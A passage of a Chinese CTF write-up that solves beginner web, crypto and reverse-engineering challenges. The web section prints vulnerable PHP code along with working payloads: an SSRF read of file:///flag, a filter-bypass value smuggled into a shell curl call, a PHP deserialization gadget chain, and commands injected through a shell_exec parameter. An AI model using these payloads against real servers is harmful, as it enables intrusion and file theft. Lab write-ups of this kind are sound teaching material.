+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&quot;url&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>, <span class="string">&quot;file://&quot;</span>)==<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nonono,no flag!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--flag在根目录下的/flag文件中---&gt;</span><br></pre></td></tr></table></figure>
+
+<p>根据提示，直接用 HackBar post <code>url=file:///flag</code> 得到 flag 。</p>
+<p><img src="https://s2.loli.net/2023/11/12/OK3dA98YCLENIfa.png" alt="9ae406195a97f3b554f02341b4ad3cdc.png"></p>
+<h3 id="你是一个真正的man吗？"><a href="#你是一个真正的man吗？" class="headerlink" title="你是一个真正的man吗？"></a>你是一个真正的man吗？</h3><p>访问靶机，看到代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;ezwaf.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&quot;url&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">ezwaf</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>, <span class="string">&quot;file&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;curl &quot;</span>.<span class="variable">$url</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;dont use file!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--flag在根目录下的/flag文件中---&gt;</span><br><span class="line">&lt;!--使用了白名单，请用file协议读文件！---&gt; hacker!</span><br></pre></td></tr></table></figure>
+
+<p>要求使用 <code>file</code> 命令读取 flag ，但又对 <code>flie</code> 进行了过滤。简单绕过即可。</p>
+<p>根据提示，直接用 HackBar post <code>url=fi\le:///flag</code> 得到 flag 。</p>
+<p><img src="https://s2.loli.net/2023/11/12/RkvyAxuIZGiX531.png" alt="48d192a9c4d41535c0e36e5b27ae21fb.png"></p>
+<h3 id="看看你的作业"><a href="#看看你的作业" class="headerlink" title="看看你的作业"></a>看看你的作业</h3><p>访问靶机，看到代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;path.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wode</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;今天我要开发一个作业系统，我的名字是:&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Homework</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yes</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;但是自己开发好累呀，推给小登做吧&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;他们不做怎么办&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$GLOBALS</span>[<span class="string">&#x27;img&#x27;</span>];</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;yes)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">System</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;历经千辛万苦，小登们终于做出来了&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;但是，我还想改改需求...&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$GLOBALS</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;un_me&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;un_me&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>经过搜索：</p>
+<blockquote>
+<p>在 PHP 中将对象、数组、变量等转化为字符串，这样便于将数据保存到数据库或者文件中，这个过程称之为序列化。当需要使用这些数据时，就需要用反序列化就是将字符串还原回原来的样子，也就是序列化的逆过程。PHP 提供了 serialize 和 unserialize 函数来支持这 2 种操作，当 unserialize 函数的参数被用户控制时就会形成反序列化漏洞。</p>
+</blockquote>
+<p>也就是说反序列化过程中，unserialize（）接受的值（字符串）可控的话，我们可以通过更改这个值（字符串），得到所需要的代码，即生成的对象的属性值</p>
+<p>我们的目标是触发到 __invoke 得到路径 ‘path’。</p>
+<p>综上所述构造：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wode</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Homework</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yes</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">System</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Wode</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; name = <span class="keyword">new</span> <span class="title class_">Homework</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; name -&gt; yes = <span class="keyword">new</span> <span class="title class_">System</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+<p>运行得到序列化之后的结果：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Wode&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;Homework&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;yes&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;System&quot;</span>:<span class="number">0</span>:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>将这个结果用 HackBar post 传参给 <code>un_me</code> 就可以触发 __invoke 得到路径 ‘path’。</p>
+<p><img src="https://s2.loli.net/2023/11/12/2LQcAk3E6rC4bJY.png" alt="32084da2bb85f267c01ef2f9f0c8c093.png"></p>
+<p>运行后得到路径 <code>/WH47/Y0u/Kn0W/7H3/P0p/main.php</code> ，访问显示 <code>nothing here!</code> 。</p>
+<p><img src="https://s2.loli.net/2023/11/12/Eqi9fS7zJRkUeja.png" alt="622412180e4a3d8243c1f9a6210fd7e5.png"></p>
+<p>F12 查看源代码，得到提示 <code>什么是?5Y573M</code> 。</p>
+<p><img src="https://s2.loli.net/2023/11/12/JrzR4yeSqWwvEP7.png" alt="6671d5d3ab9d1d9921d200913c74c392.png"></p>
+<p>前面的 ? 明显是要我们用 get 方式传参，但不知道参数是什么类型的，故使用 HackBar 传空白参数测试一下，显示 <code>Warning: shell_exec(): Cannot execute a blank command in /var/www/html/WH47/Y0u/Kn0W/7H3/P0p/main.php on line 6</code> ，可知该参数可以执行命令。</p>
+<p><img src="https://s2.loli.net/2023/11/12/SVTOjhe2QiKN6Wl.png" alt="5a948942cd979526b9db13b5ef77b4f9.png"></p>
+<p>传入 <code>ls</code> 寻找 flag 文件：</p>
+<p><img src="https://s2.loli.net/2023/11/12/x9noTgq3SDK1aQ7.png" alt="0b1a9e6aa5789724794e3f4fbcd96a06.png"></p>
+<p>看到有两个文件 <code>main.php</code> 和 <code>wh4tY0U3V3nKn0WM3.php</code> ，我们的目标显然是后者。尝试传入 <code>cat wh4tY0U3V3nKn0WM3.php</code> 读取文件，显示 <code>too long!</code> 。</p>
+<p><img src="https://s2.loli.net/2023/11/12/cRkFiXEr37U5epu.png" alt="27712ee3f4dfea1e5c0d536e04d65fc7.png"></p>
+<p>经过测试，最大可以传入 4 个字符的参数，也就是说只能使用 <code>nl</code> 读取。那文件名那么长又如何解决呢？很容易想到通配符 <code>*</code> 用于<strong>匹配任意长度任意字符</strong>。故传入 <code>nl *</code> 。返回了 <code>1 4) &#123; 4 echo &quot;too long!&quot;; 5 &#125; else &#123; 6 echo shell_exec($_GET[&quot;5Y573M&quot;]); 7 &#125; 8 &#125; else&#123; 9 echo &quot;nothing here!&quot;; 10 echo &quot;&quot;; 11 &#125; 12 ?&gt; 13 </code> ，应该是 <code>main.php</code> 的内容。</p>
+<p><img src="https://s2.loli.net/2023/11/12/SVTOjhe2QiKN6Wl.png" alt="5a948942cd979526b9db13b5ef77b4f9.png"></p>
+<p>我们查看源代码即可看到 flag 。</p>
+<p><img src="https://s2.loli.net/2023/11/12/A13MHU4qo2J5kKG.png" alt="4e9d641466f7335af850933b83811d03.png"></p>
+<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="easy-base"><a href="#easy-base" class="headerlink" title="easy_base"></a>easy_base</h3><p>打开附件得到：</p>
+<p><code>QmFzZTY0IGlzIGEgZ3JvdXAgb2YgYmluYXJ5LXRvLXRleHQgZW5jb2Rpbmcgc2NoZW1lcyB0aGF0IHJlcHJlc2VudCBiaW5hcnkgZGF0YS4gQW5kIGZsYWcgaXMgMHhGQXt0SGlzX2lTX2JhNWU2NF9lbkNvZGluR30=</code></p>
+<p>有大小写字母和末尾标志性等号。译言丁真，鉴定为 <code>base64编码</code> ，解码结果：</p>
+<p><code>Base64 is a group of binary-to-text encoding schemes that represent binary data. And flag is 0xFA&#123;tHis_iS_ba5e64_enCodinG&#125;</code></p>
+<p>得到 flag <code>0xFA&#123;tHis_iS_ba5e64_enCodinG&#125;</code> 。</p>
+<p><img src="https://s2.loli.net/2023/11/12/JcbkueId8gLtmfT.png" alt="00c52f4e1aaeb776ea1d557af47e449a.png"></p>
+<h3 id="easy-caesar"><a href="#easy-caesar" class="headerlink" title="easy_caesar"></a>easy_caesar</h3><p>打开附件得到 <code>qrzbrxnqrzfdhvduflskhudqgiodjlvyhqlylglylfl</code> ，由题可知是凯撒密码。位移 3 位得到 <code>nowyouknowcaesarcipherandflagisvenividivici</code> 。</p>
+<p><img src="https://s2.loli.net/2023/11/12/fnRUGepiL1WqtY2.png" alt="00cbf04a12d552ead1ab755fc664ea92.png"></p>
+<p>可知 flag 内容为 <code>venividivici</code> ，用 <code>0xFA&#123;&#125;</code> 包上后提交。</p>
+<h3 id="easy-morse"><a href="#easy-morse" class="headerlink" title="easy_morse"></a>easy_morse</h3><p>打开附件，看到 <code>./.-/...../-.--/.----/--/-----/.-./....././.----/-.-./-----/-.././</code> 明显是莫尔斯电码。</p>
+<p>用空格代替 / 后丢进在线工具解码得 <code>ea5y1m0r5e1c0de</code> ，包上 <code>0xFA&#123;&#125;</code> 后提交。</p>
+<p><img src="https://s2.loli.net/2023/11/12/5pCBehE8OVRcNam.png" alt="73b176d5d3a3e59844ef75047c966f77.png"></p>
+<h3 id="easy-passwd"><a href="#easy-passwd" class="headerlink" title="easy_passwd"></a>easy_passwd</h3><p>打开附件，得 <code>f6fdffe48c908deb0f4c3bd36c032e72</code> ，看上去像哈希值，硬算肯定是不行了，丢进网站找一找：</p>
+<p><img src="https://s2.loli.net/2023/11/12/wTBnRCv3FsDQYHe.png" alt="49333ee35ca546bfe9c1d2c3a70473f0.png"></p>
+<p>成功获得翻转哈希值 <code>adminadmin</code> ，包上 <code>0xFA&#123;&#125;</code> 后提交。</p>
+<h3 id="easy-rsa"><a href="#easy-rsa" class="headerlink" title="easy_rsa"></a>easy_rsa</h3><p>打开附件，是 RSA 加密：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">n = 412185872968401257793868364974500949106246851673</span><br><span class="line">e = 65537</span><br><span class="line">cipher = 238402953668524899208063558207075404357269541120</span><br></pre></td></tr></table></figure>
+
+<p>开始上工具 <code>轩禹CTF_RSA工具3.6.1</code></p>
+<p>把数据丢进去，直接分解模数：</p>
+<p><img src="https://s2.loli.net/2023/11/12/EuKvri2oeDBj3Nn.png" alt="a34867583c45dc8c5ccdd7a258ba1112.png"></p>
+<p>然后计算私钥：</p>
+<p><img src="https://s2.loli.net/2023/11/12/2jwWXpzGNvnB4u7.png" alt="43fe6dc06590d158f8c54105b1528cd5.png"></p>
+<p>再计算明文：</p>
+<p><img src="https://s2.loli.net/2023/11/12/iHB78DalYLA2VmU.png" alt="0fd5b35af4365884fe6dd31a98b29e37.png"></p>
+<p>最后明文转字符：</p>
+<p><img src="https://s2.loli.net/2023/11/12/hCcBOdGlsnkVHjK.png" alt="c2da5b4d7c5e0586a6ab1fb88c4b0e44.png"></p>
+<p>获得 flag <code>0xFA&#123;F4ct0r_Pr1me&#125;</code> 。</p>
+<h3 id="easy-wfa"><a href="#easy-wfa" class="headerlink" title="easy_wfa"></a>easy_wfa</h3><p>打开附件，得到长文本，尝试使用<a href="https://www.quipqiup.com/#google_vignette">字频分析</a>：</p>
+<p><img src="https://s2.loli.net/2023/11/12/r1PXUK5dBsemAYF.png" alt="54866b89bb3bd7b4e56128e483250b27.png"></p>
+<p>得到：</p>
+<blockquote>
+<p>the crystal valley and the flag is welcome to oxfa in a realm beyond our own where mountains whispered secrets to the rivers and trees hummed lullabies every dusk there was a valley shrouded in a radiant glow this was the crystal valley the reason for its name was clear to any wanderer who happened upon this magical place the ground was paved with gemstones trees had leaves of emerald and flowers shimmered with sapphire petals the river flowed with a serene silvery light illuminating the entire valley but the most magnificent sight was at the center of the valley a tree grander than any other with branches stretching out wide touching the skies this was the crystal tree its bark made of diamond and its fruit a crystal apple held the combined wisdom of the world legend told of its magic whoever tasted the apple would gain a deep understanding of the universe but at a price the tree would only bear one fruit every century and once picked the valley would be shrouded in darkness for the next hundred years one day a young girl named elara guided by the whispers of the wind found her way to the crystal valley mesmerized by the beauty she was tempted by the legend of the crystal tree as she approached it the tree spoke seeker of wisdom do you wish to claim the crystal apple” “i do” elara replied her voice trembling but i fear the darkness it would bring the tree responded the darkness is a consequence but not a punishment every light casts a shadow wisdom brings with it the burden of knowing gathering her courage elara chose not to take the apple instead she decided to sit beneath the tree letting its shimmering light dance around her days turned into nights and nights into days with each passing moment elara felt a connection to the world around her understanding it in ways she never imagined one morning as the first rays of dawn kissed the valley the crystal tree bore a new fruit it was no longer a crystal apple but a radiant heart shimmering with colors that had never been seen before your heart and your choice have transformed the gift whispered the tree with love and patience you have found wisdom the heart holds the beauty of understanding without casting a shadow elara with tears of joy held the heart close she realized that sometimes wisdom isn’t about taking but about giving not about knowing everything but understanding the value of everything and so the legend of the crystal valley evolved telling tales not of a crystal apple but of a radiant heart and a young girl who chose to understand the world with love the valley continued to glow brighter than ever welcoming wanderers with its gentle embrace and reminding them that sometimes the journey and the choices made along the way are more rewarding than the destination itself</p>
+</blockquote>
+<p>在第一行就看到 flag 内容 <code>welcome to oxfa</code> ，把空格替换成下划线，并用0xFA{}包上后提交。</p>
+<h3 id="easy-pow"><a href="#easy-pow" class="headerlink" title="easy_pow"></a>easy_pow</h3><p>用 nc 连接靶机，靶机返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] sha256(XXXX+cU9dMtmLhdB2RgKv) == c2d86b5307bcedf5c0f3ef0bebd0eaf3a0668481a440ca64ca455602df808b65</span><br><span class="line">[+]Plz tell me XXXX:</span><br></pre></td></tr></table></figure>
+
+<p>是要我们算出满足哈希值的前四位，一开始写了个易语言脚本，单线程跑起来超时，后面升级成多线程还是超时：</p>
+<p><img src="https://s2.loli.net/2023/11/12/4MxNtRda5fqclmE.png" alt="24c880b8d713ef4f6278912c865b92a6.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.版本 2</span><br><span class="line">.支持库 EThread</span><br><span class="line"></span><br><span class="line">.程序集 窗口程序集_启动窗口</span><br><span class="line">.程序集变量 线程句柄, 整数型, , &quot;62&quot;</span><br><span class="line">.程序集变量 线程数量, 整数型</span><br><span class="line"></span><br><span class="line">.子程序 __启动窗口_创建完毕</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.子程序 子程序1</span><br><span class="line">.参数 序号, 整数型</span><br><span class="line">.局部变量 数组, 文本型, , &quot;62&quot;</span><br><span class="line">.局部变量 a, 整数型</span><br><span class="line">.局部变量 b, 整数型</span><br><span class="line">.局部变量 c, 整数型</span><br><span class="line">.局部变量 d, 整数型</span><br><span class="line">.局部变量 前四位, 文本型</span><br><span class="line">.局部变量 pw, 文本型</span><br><span class="line">.局部变量 标记标签, 标签</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">数组 ＝ &#123; “a”, “b”, “c”, “d”, “e”, “f”, “g”, “h”, “i”, “j”, “k”, “l”, “m”, “n”, “o”, “p”, “q”, “r”, “s”, “t”, “u”, “v”, “w”, “x”, “y”, “z”, “A”, “B”, “C”, “D”, “E”, “F”, “G”, “H”, “I”, “J”, “K”, “L”, “M”, “N”, “O”, “P”, “Q”, “R”, “S”, “T”, “U”, “V”, “W”, “X”, “Y”, “Z”, “0”, “1”, “2”, “3”, “4”, “5”, “6”, “7”, “8”, “9” &#125;</span><br><span class="line"></span><br><span class="line">.计次循环首 (62, a)</span><br><span class="line">    .计次循环首 (62, b)</span><br><span class="line">        .计次循环首 (62, c)</span><br><span class="line">            .计次循环首 (62, d)</span><br><span class="line"></span><br><span class="line">                .如果 (序号 ≤ 31)  &#x27; 穷举前四位</span><br><span class="line">                    前四位 ＝ 到文本 (数组 [a ＋ (序号 － 1) × 2]) ＋ 到文本 (数组 [b]) ＋ 到文本 (数组 [c]) ＋ 到文本 (数组 [d])</span><br><span class="line">                .否则</span><br><span class="line">                    前四位 ＝ 到文本 (数组 [序号]) ＋ 到文本 (数组 [b]) ＋ 到文本 (数组 [c]) ＋ 到文本 (数组 [d])</span><br><span class="line">                .如果结束</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                pw ＝ 前四位 ＋ 尾部</span><br><span class="line"></span><br><span class="line">                &#x27; 标记标签 ＝ _启动窗口.取标记组件 (序号)  &#x27; 设置标签显示进度</span><br><span class="line">                &#x27; 标记标签.标题 ＝ 前四位</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                .如果真 (校验_取sha256 (到字节集 (pw)) ＝ 哈希)</span><br><span class="line">                    编辑框1.内容 ＝ 前四位</span><br><span class="line">                    置剪辑板文本 (前四位)</span><br><span class="line">                    信息框 (“匹配成功”, 0, , )</span><br><span class="line">                .如果真结束</span><br><span class="line"></span><br><span class="line">            .计次循环尾 ()</span><br><span class="line">        .计次循环尾 ()</span><br><span class="line">    .计次循环尾 ()</span><br><span class="line">.计次循环尾 ()</span><br><span class="line"></span><br><span class="line">&#x27; 前四位 ＝ 到文本 (数组 [4]) ＋ 到文本 (数组 [1]) ＋ 到文本 (数组 [4]) ＋ 到文本 (数组 [2])</span><br><span class="line">&#x27; pw ＝ 前四位 ＋ “123”</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27; 如果真 (校验_取sha256 (到字节集 (pw)) ＝ “7882f81ed0474a5a25eda29b87de77e62634998c403f8746239eb33086d0ea26”)</span><br><span class="line">&#x27; 编辑框1.内容 ＝ 前四位</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.子程序 _按钮1_被单击</span><br><span class="line">.局部变量 序号, 整数型</span><br><span class="line"></span><br><span class="line">线程数量 ＝ 到整数 (编辑框4.内容)</span><br><span class="line">尾部 ＝ 编辑框2.内容</span><br><span class="line">哈希 ＝ 编辑框3.内容</span><br><span class="line">.计次循环首 (线程数量, 序号)</span><br><span class="line">    启动线程 (&amp;子程序1, 序号, 线程句柄 [序号])</span><br><span class="line">.计次循环尾 ()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.子程序 __启动窗口_将被销毁</span><br><span class="line">.局部变量 i, 整数型</span><br><span class="line"></span><br><span class="line">.计次循环首 (线程数量, i)</span><br><span class="line">    强制结束线程 (线程句柄 [i])</span><br><span class="line">    关闭线程句柄 (线程句柄 [i])</span><br><span class="line">.计次循环尾 ()</span><br></pre></td></tr></table></figure>
+
+<p>后面改用 Python 单线程都能算出来不超时，我再也不偷懒用易语言了😭。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数，计算字符串的SHA256值，并返回十六进制字符串</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha256</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">  <span class="keyword">return</span> hashlib.sha256(<span class="built_in">str</span>.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个数组，包含所有可能的字符</span></span><br><span class="line">chars = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个末尾文本，用于拼接</span></span><br><span class="line">tail = <span class="string">&quot;cU9dMtmLhdB2RgKv&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个目标SHA256值，用于比对</span></span><br><span class="line">target = <span class="string">&quot;c2d86b5307bcedf5c0f3ef0bebd0eaf3a0668481a440ca64ca455602df808b65&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个标志变量，用于判断是否找到匹配的前四位</span></span><br><span class="line">found = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个计数变量，用于记录穷举的次数</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用itertools.product函数枚举所有可能的4位文本</span></span><br><span class="line"><span class="keyword">for</span> text <span class="keyword">in</span> itertools.product(chars, repeat=<span class="number">4</span>):</span><br><span class="line">  <span class="comment"># 将元组转换为字符串</span></span><br><span class="line">  text = <span class="string">&quot;&quot;</span>.join(text)</span><br><span class="line">  <span class="comment"># 计算当前文本和末尾文本的SHA256值</span></span><br><span class="line">  <span class="built_in">hash</span> = sha256(text + tail)</span><br><span class="line">  <span class="comment"># 比对当前文本和末尾文本的SHA256值和目标SHA256值</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">hash</span> == target:</span><br><span class="line">    <span class="comment"># 如果匹配，打印当前文本，并设置标志变量为True</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Found:&quot;</span>, text)</span><br><span class="line">    found = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  <span class="comment"># 增加计数变量</span></span><br><span class="line">  count += <span class="number">1</span></span><br><span class="line">  <span class="comment"># 每穷举1000次，打印一次进度</span></span><br><span class="line">  <span class="keyword">if</span> count % <span class="number">1000</span> == <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Tried:&quot;</span>, count)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果没有找到匹配的前四位，打印提示信息</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;No match found.&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/11/12/A4QpTbFEN56h1wG.png" alt="d74209dea723e77765386e0db9d837cb.png"></p>
+<h3 id="leak-d"><a href="#leak-d" class="headerlink" title="leak_d"></a>leak_d</h3><p>用 nc 连接靶机，得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Here is N</span><br><span class="line">58784043329716425101104920485916134508608730289747018833570407989709034466775848701054647257359079456346201966576547653033761263229418566622771618055615982689289173483325919025724308434837288136047921582841415394591195617253684068077478644497452849554781529057195929093531857775656145378166642876833518271057</span><br><span class="line">You can&#x27;t decrypt this!</span><br><span class="line">24903367589297538772459182499940144075768060261218948085911038195183957980888992488923174631012233502913064748086697378366162539506905880542418761270066479878024435193765659584225831601757715124471932034706793453118800099415326012082183555161151102828404085013842591395589253661725992041199513931807480391389</span><br><span class="line">OMG d leaked!</span><br><span class="line">31006100520646922851137447416835511813076378055998519111934660777702090474808238672781131977240164466591017434130614756093062840034095869676914861726147561803024335214576790837885715640650150440299509704447151481530950239462080240002988827121838240184499710476547542702973366910409540745089024825774321885057</span><br></pre></td></tr></table></figure>
+
+<p>继续上工具 <code>轩禹CTF_RSA工具3.6.1</code></p>
+<p>把数据全丢进去，直接计算明文：</p>
+<p><img src="https://s2.loli.net/2023/11/12/DYfe15OpiCTHh3y.png" alt="c9d808f34949096efeac75509a8d7cc0.png"></p>
+<p>再明文转字符：</p>
+<p><img src="https://s2.loli.net/2023/11/12/lPoFCr4TedKA28Y.png" alt="e54159a8da7b0ce56ccf8e5905ec1007.png"></p>
+<p>即得到 flag 。</p>
+<h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="Oceaner的怜悯"><a href="#Oceaner的怜悯" class="headerlink" title="Oceaner的怜悯"></a>Oceaner的怜悯</h3><p>下载附件，看十六进制文件就可以看到 flag <code>Redrock&#123;re_15_ea5yToT&#125;</code> 。</p>
+<p><img src="https://s2.loli.net/2023/11/12/bnD6YxdhCvyskUF.png" alt="135da86a3d3ac10c12ef66aae574b801.png"></p>
+<h3 id="Oceaner的仁慈"><a href="#Oceaner的仁慈" class="headerlink" title="Oceaner的仁慈"></a>Oceaner的仁慈</h3><p>打开附件闪一下就没了，在终端中打开 <code>.\Oceaner.exe</code> ，可以看到 flag 一闪而过 。录屏然后逐帧看得到 flag <code>Redrock&#123;DoYouReallyDoNotThinkREIsSimple???&#125;</code> 。</p>
+<p><img src="https://s2.loli.net/2023/11/12/CLpzHcmgTEtkK49.png" alt="963cffed8ef11cb3ea91a4ce3ebb39de.png"></p>
+<h3 id="点击就送flag"><a href="#点击就送flag" class="headerlink" title="点击就送flag"></a>点击就送flag</h3><p>我的唯一一道一血题嘤嘤嘤。</p>
+<p>运行附件，虽然是点击就送，但是鼠标移上去按钮就跑了，点不到，根本点不到，猎杀都点不到。</p>
+<p><img src="https://s2.loli.net/2023/11/12/8eBNkptUu6ZxsXI.png" alt="d5fc346db9b4abd33bffa7e8f086a18b.png"></p>
+<p>用 OllyDbg 打开附件：</p>
